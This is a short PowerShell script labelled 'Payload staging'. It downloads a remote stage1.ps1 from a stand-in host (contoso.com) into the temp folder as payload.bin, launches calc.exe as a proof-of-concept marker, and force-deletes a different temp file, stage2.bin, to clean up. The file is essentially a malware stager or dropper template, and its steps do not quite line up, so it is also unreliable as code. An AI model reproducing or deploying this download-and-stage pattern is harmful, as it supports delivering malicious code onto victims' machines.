<# Payload staging #>
[CmdletBinding()]
param(
    [string]$FetchUrl = "https://contoso.com/stage1.ps1",
    [string]$LocalPath = "$env:TEMP\payload.bin"
)
(New-Object System.Net.WebClient).DownloadFile($FetchUrl, $LocalPath)
Start-Process -FilePath "calc.exe"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
